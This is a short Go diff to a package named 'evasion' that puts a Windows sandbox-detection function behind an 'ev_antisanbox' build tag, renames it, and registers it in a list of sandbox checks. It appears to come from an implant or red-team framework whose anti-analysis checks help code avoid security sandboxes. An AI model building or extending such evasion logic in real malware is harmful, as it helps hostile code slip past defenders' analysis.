@@ -1,4 +1,4 @@
-//go:build windows
+//go:build ev_antisanbox && windows
 
 package evasion
 
@@ -12,7 +12,7 @@ import (
 	"unsafe"
 )
 
-func SandboxDetected() bool {
+func detectSandbox() bool {
 	score := 0
 
 	// -- High-confidence
@@ -392,3 +392,5 @@ func recentDocsEmpty() bool {
 	}
 	return len(entries) == 0
 }
+
+func init() { sandboxFns = append(sandboxFns, detectSandbox) }
